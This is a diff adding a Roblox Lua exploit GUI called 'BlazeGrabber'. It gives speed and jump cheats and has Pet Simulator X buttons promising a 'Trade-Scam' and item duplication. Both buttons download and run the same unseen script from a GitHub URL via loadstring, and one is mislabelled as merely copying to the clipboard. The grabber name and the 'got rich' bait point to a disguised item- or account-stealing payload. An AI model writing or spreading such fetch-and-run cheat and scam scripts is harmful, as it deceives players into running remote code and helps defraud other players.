@@ -1,0 +1,30 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+
+local Window = Library.CreateLib("BlazeGrabber -- By BlazeGrabber#2086", "BloodTheme")
+local Tab = Window:NewTab("Main")
+local Section = Tab:NewSection("StupidShit")
+Section:NewButton("Please Join My Discord", "Press To Copy Invitation to Clipboard", function ()
+    setclipboard('https://discord.gg/rVS6BXr2')
+end)
+
+Section:NewSlider("WalkSpeed", "More Speed", 500, 25, function(s) 
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+end)
+Section:NewSlider("JumpPower", "Jump Higher", 500, 50, function(s) 
+    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
+end)
+
+Section:NewKeybind("Activate/Deactivate GUI", "You Can Customize To The Key You Want", Enum.KeyCode.F, function()
+	Library:ToggleUI()
+end)
+
+
+local Tab = Window:NewTab("Pet Sim X OP")
+local Section = Tab:NewSection("Press To Execute Script")
+Section:NewButton("Enable Trade-Scam", "Press To Copy To Clipboard", function ()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pugz-1/PSX_HOLOGRAM_V7/main/New_PsxDupeGui", true))()
+end)
+Section:NewButton("Enable Dupe Script", "PRESS FOR SCRIPT", function()
+    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Pugz-1/PSX_HOLOGRAM_V7/main/New_PsxDupeGui", true))()
+end)
+Section:NewLabel("Legit got rich cos of this script") 
